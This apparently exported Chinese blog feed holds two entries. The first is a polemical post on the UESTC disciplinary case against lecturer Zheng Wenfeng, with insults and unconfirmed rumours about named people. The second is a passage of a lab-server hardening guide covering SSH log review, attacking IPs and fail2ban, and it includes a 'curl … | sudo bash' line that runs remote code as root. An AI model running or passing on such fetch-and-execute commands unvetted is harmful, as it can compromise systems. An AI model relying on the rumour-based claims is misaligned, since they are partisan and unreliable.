仁兄，竟然列出了行文错误之处达十条之多。就我在行政单位处理公文的经验来说，这百分百是份真文件，在校学生起个哄闹下事坑坑老师还行，要说造假水平还到不了这个层次。一、“XX单位文件”这是红头常用的版头，这种用法完全正确。二、关于文号，这是一份对内的文件，所以用“师德”二字完全正常，不是对外文件，不一定非要用“电科XX”开头。三、注意看年份外边是六角括号，这是公文发文年份的专用符号，不是专业人士都不知道这符号怎么输入，多半打成【】符号，这是很多假公文常犯的错误。四、关于文件序号，1号文，这个太正常不过了，师德方面本来事情就少，顶多开开会，哪用得着正式公文，所以七月份才发第一份文件很正常，发多了反倒是假文件了。另外常见公文编号错误就是把“1号”写成“第1号”，这份文件妥妥的避开这个坑。五、关于文件标题，“决定”是一个文种，关于XX的决定，就像关于XX的通知一样，一定是“的+文种”的格式，那些叫嚷“XX的处理决定”的可以洗洗睡了，还有说标题加个引号的，求您别不懂装懂误人子弟行不？六、落款师德建设委员会，盖教师工作部的章，还特别标明代章，就这严谨程度，是造假的娃娃们达不到的高度。师德委员会不是一个常设机构，没有专门的人员编制，没有印章很正常，而又要用它的名义出文件，那么就只好找个跟它工作相似的部门代章，这才是严谨的做法。要真造假，直接出个教师工作部的文件或者弄个师德委员会的章不是更好？知道代章的就如同前文所说知道六角符号的，这都是真正处理公文的专业人士。七、还有说字体错误的，拜托，标题二号小标宋，正文三号仿宋，这么正确的公文字体你还能找出错误？你没见low逼的假公文标题都用黑体么？知道在电脑上安装小标宋体字的都是半个专业人士。八、还有说这个处理决定应该由党委或者学校来出的，拜托，老郑他犯了哪条党纪国法了，就他那点破事，顶多也就一个言论不当，够不上大的处分，党委和学校那都是出警告、记过、降级、开除之类的处分决定。老郑这事儿吧，其实不严重，但是引起了大舆论，这就得处理了，既然事情不严重就不适合用党委或学校名义来处理，用师德委员会的名义刚刚好。基于以上，该问题所有关于文件真假的讨论就此终结。这份文件必定是真的，从公文格式讨论文件真假的同学，你们可以洗洗睡了。 &gt;</p>
<p>什么？为什么官网没有这个机构？对不起，我电行政的办事速度、我电网站的维护更新速度和土豆服务器我不想和你解释，我也不知道怎么解释,两天前就发生过下图这种事:</p>
<p><img width=350 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E9%97%A8%E6%88%B7.jpg"/></p>
<h3 id="如何看待知乎治校">如何看待知乎治校</h3>
<p>当然是支持啊，有人因为这个反对知乎治校，我就不明白，这事能怪到知乎治校头上啊？而且这此想搞大新闻的电卫兵可是活生生被骂上热搜的。知乎治校更有利于公正公开，也可以像这次一样让众人看清楚全过程，真有了事河畔狗管理真出了事第一时间删帖，邵振海张翼德宁宁都是河畔删帖空瓶查水表转战知乎才闹大的。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzY4MTEwODg0">知乎治校<i class="fa fa-external-link-alt"></i></span>我怎能不资瓷，<span class="exturl" data-url="aHR0cHM6Ly90Lm1lL29oY2R6eg==">电报治校<i class="fa fa-external-link-alt"></i></span>就更好辣 如何看待称「四大发明在世界上都不领先」高校老师因“师德失范”遭停课两年？ - 竹青的回答 - 知乎 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OC9hbnN3ZXIvODAxMzU3ODg1">https://www.zhihu.com/question/342049298/answer/801357885<i class="fa fa-external-link-alt"></i></span> &gt;<strong>“但凡学生有别的体面方法反抗，也不会采取这么复杂下作的方式，借助规则把事情做绝。”</strong>我就奇怪了，以往碰到这种问题，资乎主流的口径不应该是这样的么？而且我记得，通常资乎都是站在诸如学生这样的弱势群体一边的，大佬们都是无条件支持弱势者的反抗的。怎么？因为事关“文化自信”，这次都转而维护“师道尊严”了？学生的反抗呢？这次就被你们无视了？说到底这里批判学生的和给此类立场点赞的诸位，并不是真的想看到平等的师生关系，也不是真的支持弱者，只不过是屁股使然罢了。</p>
<p>这次微博上以奥老师为首的正能量学阀以及狗公知们张口闭口哭的那个惨啊，把老师描绘成了楚楚可怜的弱势群体，向我们展示了学阀的无耻嘴脸。国内硕导博导掌握生杀大权，欺压学生时没见某些狗跳出来这么激动。武汉爸爸大学那会微博上某些教授的嘴脸可不是这样啊，不仅不出来伸张正义，卖惨装死可在行了。到底还是屁股决定立场啊。 还有一些狗公知，监督政府时一口一个把权力关在笼子里，轮到自己了，满嘴自由；你们双标和上来就喷不是一天两天了，行为坦荡程度都不如境外轮子，和花公公周带鱼可真是势均力敌的对手。</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827111902.png" alt="如此厚颜无耻之徒" /> 颇有在Metoo那会鄢烈山刘瑜等一众老贼的嘴脸：Metoo运动too到公知圈，大喊Metoo是文革大字报民粹 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0Btb3JlbGVzcy/oo4XlpJblrr7nmoTliJjnkZwtYjk2MTJlNGMwMDdj">“何不食肉糜”的劉瑜——自由派公知的衰落<i class="fa fa-external-link-alt"></i></span>，<span class="exturl" data-url="aHR0cHM6Ly90aGVpbml0aXVtLmNvbS9hcnRpY2xlLzIwMTgwODA2LW5vdGVzLW1ldG9vLWxpdXl1Lw==">端传媒地址<i class="fa fa-external-link-alt"></i></span> 这里节选一段： &gt;刘瑜指责网上发声是文革式的大鸣大放贴大字报不走法律途径，且不说受害者网上发声要承受巨大压力，被人指责不检点不说，还要被人指责卖了还没达到目的所以出来指认。退一步讲，在中国走法律途径行得通吗，朱军一个小小case都被压制下来不许声张，她却以为中国真是法治国家，走法律途径可以得到公正的结果，类似于问“何不食肉糜”。 文革贴大字报跟此事有任何相似之处吗，按照邓式官方文革解读，贴大字报是冲击社会现有秩序，但是还有1978年发生的西单民主墙事件，那是公民自发的意见表达机会。 大鸣大放起始于1957年开始的帮党整风的运动，是“百家争鸣，百花齐放”的延伸。贴大字报在文革中比较盛行，也对各级大小官员有一定的约束作用。四大作为公民自由表达的基本权利被写进了1975年宪法。文革结束后也没有马上废止，还写进了1978年宪法。直到发生了西单民主墙，矛头直指最高领导人以后，于是到1980年被当局取消。人民有了自由表达的权利就会乱套，这是官方意识形态一贯的思路，网上表达就是贴大字报，从而导致社会乱套，这是一套非常荒谬的逻辑。刘瑜哥伦比亚政治学博士毕业，主攻方向就是文革，把大鸣大放大字报完全等同于暴民政治，显然不符合历史事实。 出身于省部级官员家庭的刘瑜可能一路顺风顺水没被人占过便宜，但是那也不应该站着说话不腰疼说穿着暴露活该被性侵。 公民个人表达就扣上一个民粹搞文革的帽子，煽动民粹带节奏的是官方公号，不是动不动就被封号禁言的个人帐号。可见刘瑜坚持的还是主流意识形态立场。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jaGluYWRpZ2l0YWx0aW1lcy5uZXQvY2hpbmVzZS8yMDE4LzA3L+iDoea2tW1hcnZpbu+8muWRiuWIq+WFrOefpeaXtuS7oy8=">胡涵Marvin：告别公知时代<i class="fa fa-external-link-alt"></i></span></p>
<p>什么时候能这样义，什么时候才有资格谈不要知乎治校，不要举报，不要贴大字报 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827112537.png" alt="我也很好奇" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NC9hbnN3ZXIvODAzNDY2NDEz">如何评价电子科技大学对于郑文锋老师做出的处理决定？ - 琅邪杨文理的回答 - 知乎<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="教育部or你电">教育部or你电</h3>
<h4 id="是不是上面的意思">是不是上面的意思</h4>
<p>据小道消息，教育部的意思，学校是想保这个老师的没保住。 是学校干的还是教育部的意思，我倾向于是教育部的意思。我电，啊，这个大家也都知道，学校行政出了事从来都是偏袒老师的，说沆瀣一气也不为过。这个嘛，对比俺们学校之前张翼德邵振海宁宁的处理力度和其他老师与学生的小纠纷。再看看陈宝宝部长有关师德的讲话，俺觉得就是教育部干的，迫真（再次暴论） 因为知乎闹大半夜上了个热搜第一就对老师做出这种处罚，不可能，这不你电，这不大气大气，更何况知乎问题下面全是骂电卫兵支持老师，要按照舆情也因该是处罚学生</p>
<h4 id="谁之过">谁之过</h4>
<p>一群人就乱喷吧，也不看看某委员会委员长是谁，也不看看章上那镰刀锤子，能把锅扣在校长头上，校长确实咳咳咳，他一个致公党员可管不了党委和师德委员会的事，但也不能啥锅都往校长头上扣， 是吧，网络喷子们？ <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pica.jpg" alt="这回不是云法官，这回是真律师" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pica2.jpg" alt="不评价" /> 无中生蛆，反正这次我看到的护校蛆连微博协会拉皮条事件中的十分之一都不到（那又是什么事件？无可奉告，微博自己搜吧，古战场遗迹应该还在）。恁比女拳还会隔空打拳。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pica3.jpg" alt="恁比女拳还会隔空打拳" /> 说起处分学生，甚至一堆大吼开除学生的，这时候就不言论自由、学术自由啦，这回就不处罚过重啦？还有一堆法律博主，恁依据哪条法律，哪条规定啊？这个时候不提什么合不合法辣，上图中律师连是不是那个女研究生干的都不还不确定呢，看到几张图捕风捉影，就开始骂辣，恁名字里还宪法呢。</p>
<h3 id="补充和后续">补充和后续</h3>
<p>郑老师的官网个人主页打不开了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/page1.PNG" alt="8.22日官网个人主页" /></p>
<blockquote>
<p>微博id@Kakyouin 6月15日，郑文锋问题被发到知乎。 6月24日《 电子科技大学教师师德失范行为处理办法（试行） 》通过，并于7月4日印发。 7月16日，电子科技大学根据7月4日印发的《办法》对郑文锋6月份的行为作出处理。 按这个溯及既往、加班上马的思路，世界上没什么解决不了的问题和解决不了的人。</p>
</blockquote>
<p>这样的话貌似涉及秋后算账，程序有问题</p>
<p>看来处罚应该七月那会就已经落实了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic6.jpg" alt="河畔小道消息" /></p>
<p>在8.22晚8至9点，万转千转的几篇微博评论区先后遭到和谐 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/byxf.jpg" alt="未经证实的消息" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic8.jpg" alt="疑似控评" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/tognhzhiwei.jpg" alt="补充" /></p>
<p>之前凤凰搜狐等几家媒体的评论区早早关闭 一天之前博主琉璃厂人质问是否是教育部指使的微博被删除 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E7%90%89%E7%92%83.jpg" alt="琉璃厂人" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E7%90%89%E7%92%832.jpg" alt="琉璃厂人" /></p>
<p>聊天记录中提到的书《中国的发明创造-古往今来话中国》：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzk5MjA3NTAw">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - skywear的回答 - 知乎<i class="fa fa-external-link-alt"></i></span></p>
<p>聊天中提到的辩证法，我直接扔个链接吧<span class="exturl" data-url="aHR0cHM6Ly93d3cuZG91YmFuLmNvbS9ncm91cC90b3BpYy84NTM0NzE2Lw==">https://www.douban.com/group/topic/8534716/<i class="fa fa-external-link-alt"></i></span></p>
<p>更新，河畔上知乎微博上好多将郑老师名字写成郑文峰的，包括上面截图里的童之伟老师博文，应该是“郑文锋”</p>
<p>更新，侠客岛，央视和光明日报的微信公众号评论了这一事件</p>
<p>更新，发现许多地方有一些三无小号跑出来疑似洗地，包括但不限于知乎微博河畔，请你们上大号 怂到用三无小号，不如自挂贫血楼 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NC9hbnN3ZXIvNzk3MzU5MjI0">https://www.zhihu.com/question/341876584/answer/797359224<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/washfloor2.PNG" alt="知乎上的" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/washfloor.PNG" alt="河畔上的" /></p>
<p>更新，河畔同学发帖称征集当事人接受采访 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/fazhiribao.png" alt="法制日报" /></p>
<p>更新，博主黄少卿在微博扬言抵制某电，转发过五千，被删除。暂时不知道自己隐藏的还是渣浪干的，他的六月之后的微博内容一下子全没了。河畔有人称该博主控评并删除其评论。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/hsq.jpg" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/hsq2-390x357.jpg" /> 某电表白墙开始怼黄某人，目前黄某人再次发了一条微博。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/hjs.jpg" /> 恁这发个声明还要想几天，恁是树獭吗？开口就拒绝一切有关合作，郑老师也是电子科大的，他还有些商业创新项目，找你合作你要不要抵制？ 被怼了又重申“我尊重电子科大的每一位老师和每一位同学”，那几个你口中的红卫兵你尊不尊重？还重申，说的你好像之前尊重过一样。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/dddsx.jpg" alt="我佛辣" /> 跟个铁憨憨一样，真是，看看武汉爸爸大学那会当时一群人怎么抵制的：宣布从18年开始，如果武汉理工不道歉、不悔改、王攀不处理，高考报考武汉理工入学的学生不再录用。没有搞得已经在武理的学生为难，试图通过打击武理分数线来在不伤及无辜的情况下给校方施压。 武理当时冒着查水表危险广场写字的学生、放白花的学生，大家要是照宁这种抵制法抵制武理，怕是都要遭重，学生何辜？ 当初那个知乎问题可是被骂上热搜的，当时我目测成电学生及校友骂题主的超过95成，就是现在，河畔等地骂那几个研究生支持老师的怕是也超过9成。至于成电老师，你觉得会有老师喜欢举报？你上来就抵制，恁这做法比抵制日货还牛逼，简直战狼在世，就这恁还在微博当公知骂五毛喷抵制日货的愤青呢。反正恁逼逼两句自己也没损失，微博一片叫好，几千转发，一天涨粉几千，死道友不死贫道。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/dddsx.jpg" alt="我佛辣" /></p>
<p>更新，河畔有人发帖悬赏，目前赏金已经上千 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/capture.PNG" alt="悬赏帖子" /> 更新, 河畔上泥巴同学的消息 <img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190906132928.png" alt="picture"/> <img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190906132859.png" alt="picture"/></p>
<p>更新，我大概知道是什么事了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic10.jpg" alt="隐情" /> 那一年，20岁，事个学生 <img src="https://i.imgur.com/oA0Zc27.jpg?1" alt="小道消息" /> 那这样的话就更新到这里了，最后祝你，身体健康，再见。</p>
<h3 id="qa">Q&amp;A</h3>
<h4 id="大举报时代要来了">大举报时代要来了?</h4>
<p>早就来了,祝衮衮诸公，头颅安好，不上路灯</p>
<h4 id="文革红小兵要来了">文革红小兵要来了？</h4>
<p>兔区八组晋江粉红部分狗粉丝，早就来了，当然还有看上去特别正义的Metoo，是<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5MTUyMTM5MS9hbnN3ZXIvNDc3NDEwMTI0">举报污蔑重要推手<i class="fa fa-external-link-alt"></i></span>，不过，我觉得你们该担心的根本不是红小兵 <img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/kaiser.jpg" alt="影帝离任讲话0.5倍速限定"/></p>
<h4 id="你怎么看">你怎么看</h4>
<p>我用手机看，当然写这篇博文时我正电脑前网上冲浪。</p>
<h4 id="如何看待核心通识成电讲坛之类的课程活动">如何看待核心通识、成电讲坛之类的课程活动</h4>
<p>画虎不成反类犬，我个人认为这和学院重组乱象一样，李言荣负有责任。 还有这几年的政策调整电赛折戟、robomaster实力不在，一个个连硬课都不敢选、怕影响成绩嫌性价比低不愿投入竞赛，已经影响了理工科学校的根基。 每次看到<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI4NjE2NzM4Mi9hbnN3ZXIvNDQ5Mjc3NDU3">蒋学长的回答<i class="fa fa-external-link-alt"></i></span>，就很唏嘘。 还有你电那个<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyNjU2MjExMy9hbnN3ZXIvNzE0MDMzNzk4">感人的实验报告<i class="fa fa-external-link-alt"></i></span>,大物实验我都不知道每次手抄好几页图个啥。 我不知道这样下去你电还是工程师的摇篮吗？<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ0NzY5OTcyL2Fuc3dlci8xMjk3NDYxMjM=">电子科大UESTC的教育存在什么问题？ - John.L的回答<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="如何评价创新课程">如何评价创新课程</h4>
<p>大众创业、万众创新之类的口号现在也和互联网+小黄车一样凉透了，一地鸡毛。我之前上课，听一位老教授说他当年在老交大上大学那会，大跃进就跟现在一样啊，发动学生搞发明，搞了很多稀奇古怪的玩意。跑题了，这里不提当年那些事了，回到现在，这种水也不是不水也不是的鸡肋课程，我觉得在全校范围来看弊大于利。</p>
<h4 id="如何评价陈宝生">如何评价陈宝生</h4>
<p>党棍，要向全国人民谢罪的，包括但不限于留学生超国民待遇，中小学减负， 2049年，教育部领导的中国教育即将正式将稳稳地立于世界教育中心（指开花</p>
<h4 id="如何看待各校成立师德委员会">如何看待各校成立师德委员会</h4>
<p>陈宝生的又一丰功伟绩，跟寻衅滋事一样变成口袋罪，还是武汉爸爸大学等一系列事件发生之后表的态，然而，大家都懂的...(说起来我当时在微博怼武汉爸爸大学还把平均转评过10的大号给炸了...) 引用一下今天童之伟博主的说法 &gt;电子科技大学师德建设委员会发布处罚郑文峰高工的这份文件缺乏正当根据，实际上是严重侵犯郑老师合法权利和自由的行为，应当尽快撤回。任何组织无权随意制定道德、执行道德、做道德裁判，法外剥夺公民受宪法保护的基本的权利和自由。郑老师作为一个科技工作者，有权就科技史上的问题发表不同于其他人的看法</p>
<h4 id="如何评价四大发明">如何评价四大发明</h4>
<p>“四大”是用来凑数的，为何不是三大，不是五大？欧洲古滕堡印刷术跟中国活字印刷没多大关系，甚至东亚古代也是雕版印刷为主。至于火药，俺觉得欧洲对于火药威力的改进和枪炮的改进贡献远大于东亚。 反正中医不太行，传武不太行，<span class="exturl" data-url="aHR0cHM6Ly94dy5xcS5jb20vaXBob25lL20vbGVnYWN5aW50b3VjaC80N2E3ZjJjMDMzODAxYTgxODUyNDNlNmNhOGRmNWZhZS5odG1s">四大名著<i class="fa fa-external-link-alt"></i></span>也是,课本里的地动仪和司南就更扯了</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudGhlcGFwZXIuY24vbmV3c0RldGFpbF9mb3J3YXJkXzEzNTc0NDQ=">访谈︱江晓原：中国“四大发明”的争议从何而来<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="为何你电装死不出来回应">为何你电装死不出来回应</h4>
<p>这个，学校行政部门及领导可能还在放假哎，你看主楼好多办公室都没开门（手动滑稽） 难道学校不着急吗？这个可能还真不急，毕竟见得多了。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190826104258.png" alt="tgchannel" /> 另外指望师德委员会怎样怎样恐怕希望不大，你看委员长是谁，挡尾苏吉wyf哦（不用查了，约等于泥电一把手）</p>
<h3 id="详情参考">详情参考</h3>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NA==">知乎原问题<i class="fa fa-external-link-alt"></i></span> （已被隐藏） 其他相关问题 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTcyNjk5OS9hbnN3ZXJzL3VwZGF0ZWQ=">如何看待电子科技大学个别学生公然诱导舆论，构陷副教授郑文锋侮辱四大发明？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE3MzU4Mzg2">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTc0NDU1MC9hbnN3ZXIvNzk2Njc4Mjc3">如何看待知乎热榜“如何看待电子科技大学副教授郑文锋公然侮辱四大发明”？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NA==">如何评价（疑似）电子科技大学对于郑文锋老师做出的处理决定？<i class="fa fa-external-link-alt"></i></span>、 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OA==">如何看待称「四大发明在世界上都不领先」高校老师因「师德失范」遭停课两年？<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9sb2c=">原问题的编辑记录<i class="fa fa-external-link-alt"></i></span> 可以看到电卫兵试图搞个大新闻时的最初提问内容，河畔搞事早已删除，时间久远，没有备份。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE5NDE4NzIw">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - 红盾局长克里斯的回答 - 知乎<i class="fa fa-external-link-alt"></i></span> 一个暴躁师兄的回答，我对该研究生的态度基本同此。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE3ODEzMzU2">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - 知乎<i class="fa fa-external-link-alt"></i></span> 对于“公然侮辱”的评价，我的观点基本同此</li>
<li>成电新闻两则<br />
<span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTcyMzgy">学校举行第四期思政及师德师风培训班结业典礼暨师德师风建设专题会议<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTY3MTE4">四川省教育厅网站报道我校师德师风建设工作<i class="fa fa-external-link-alt"></i></span> 可以看到是有这个电子科技大学师德建设委员会的</li>
<li>Oh CD ZZ 友情频道的相关报道<br />
<span class="exturl" data-url="aHR0cHM6Ly90Lm1lL29oY2R6ei8xMDA3">https://t.me/ohcdzz/1007<i class="fa fa-external-link-alt"></i></span> 、 <span class="exturl" data-url="aHR0cHM6Ly90Lm1lL29oY2R6ei84MjQ=">https://t.me/ohcdzz/824<i class="fa fa-external-link-alt"></i></span>等</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE3NTYyOTY4">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - 真实工科肥宅的回答 - 知乎<i class="fa fa-external-link-alt"></i></span>郑老师的学校和论文，郑老师是成理博士百度百科</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5MTUyMTM5MS9hbnN3ZXIvNDc3NDEwMTI0">如何看待美国女权领袖、MeToo 运动发起者被曝性侵男演员后暗中支付巨额封口费？ - 奈芙拉塔的回答 - 知乎<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ2NDQ1NjYyL2Fuc3dlci8xMDEzMzc2NDQ=">邵振海事件<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzYxOTc2MzUyL2Fuc3dlci8xOTM1NjYyMTI=">张翼德事件<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cud2VpYm8uY29tLzM5MTA3MzY0NjcvR2tHZWhyaDdr">宁宁事件<i class="fa fa-external-link-alt"></i></span></li>
<li>河畔帖子（需要账号，这里不放了）</li>
<li>《中国印刷史研究》辛德勇 太长不看版，辛德勇微信公众号文章：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJek16ZzJNVFF3Tnc9PSZhbXA7bWlkPTIyNDc0ODg2MDQmYW1wO2lkeD0xJmFtcDtzbj0zZWQzYTViMWU4ZGYyMjVkN2I3ZTNkZGU1YjY0MDU4ZA==">我看中國古代的活字印刷<i class="fa fa-external-link-alt"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
  </entry>
  <entry>
    <title>教研室服务器维护</title>
    <url>/d6da/</url>
    <content><![CDATA[<p>教研室要倒闭啦，师兄毕业跑路啦！ <a id="more"></a> ## 写在前面的话</p>
<p>top、ls命令并不总是好用，特别是挖矿恶意程序使用rookit等方式隐藏进程、篡改系统命令，会出现CPU跑满但是top命令看不到高占用进程的情况</p>
<p>不想用vim又不得不在linux下改东西，可以不用nano了，这有个<span class="exturl" data-url="aHR0cHM6Ly93bWRwZC5jb20vcWlhbmctbGllLXR1aS1qaWFuLWxpbnV4emhvbmctZHVhbi13ZW4tYmVuLWJpYW4tamktcWktbWljcm8v">micro<i class="fa fa-external-link-alt"></i></span>, 拿好</p>
<p>安装：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /usr/bin<span class="token punctuation">;</span> <span class="token function">curl</span> https://getmic.ro <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="安全问题">安全问题</h2>
<p>教研室的服务器之前就被黑过 老师兄装的Ubuntu，默认端口默认用户名超简单密码直接远程登录，行吧 教研室出现了断层，现在的师兄们（以及并夕夕40万却没用过Linux的师姐）Linux都还没我熟，行吧 服务器以后就扔给我了，行吧</p>
<p>之前折腾Docker的时候看日志发现一堆乱七八糟的</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">grep</span> <span class="token string">"Accepted password for root"</span> /var/log/auth.log <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$11</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span>
<span class="token function">grep</span> <span class="token string">"Failed password for root"</span> /var/log/auth.log <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$11</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>发现一堆可疑ip几千次登录尝试,哇,又被当小鸡扫了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">3073 Failed
  2593 112.85.42.185
  2471 218.92.0.168
   714 112.85.42.187
   363 218.92.0.188
   261 112.85.42.188
   103 222.186.175.220
   103 222.186.175.148
    86 222.186.180.41
    81 222.186.173.180
    78 222.186.180.8
    78 222.186.180.223
    74 222.186.173.154
    69 222.186.175.161
    65 49.88.112.55
    59 222.186.180.9
    59 222.186.175.182
    57 222.186.180.17
    57 222.186.175.167
    55 222.186.175.202
    55 185.164.72.251
    53 222.186.175.215
    51 222.186.169.194<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>改一下密码和SSH端口</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sed</span> -i <span class="token string">"s/Port .*/Port 你的端口/g"</span> /etc/ssh/sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>安装sshfilter或者flai2ban，这里我用的fail2ban。<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> fail2ban
